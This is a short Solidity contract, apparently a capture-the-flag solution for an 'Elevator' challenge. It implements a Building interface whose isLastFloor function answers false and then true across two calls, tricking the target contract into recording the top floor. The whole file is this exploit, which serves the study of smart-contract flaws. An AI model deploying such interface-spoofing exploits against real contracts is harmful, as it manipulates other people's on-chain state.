// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract ElevatorAttacker is Building {
    Elevator public elevator;
    bool isEntered;

    constructor(Elevator _elevator) public {
        elevator = _elevator;
    }

    function isLastFloor(uint) external override returns (bool) {
        if (isEntered == false) {
            isEntered = true;

            return false;
        }
        isEntered = false;

        return true;
    }

    function goTo(uint _floor) public {
        elevator.goTo(_floor);
    }
}
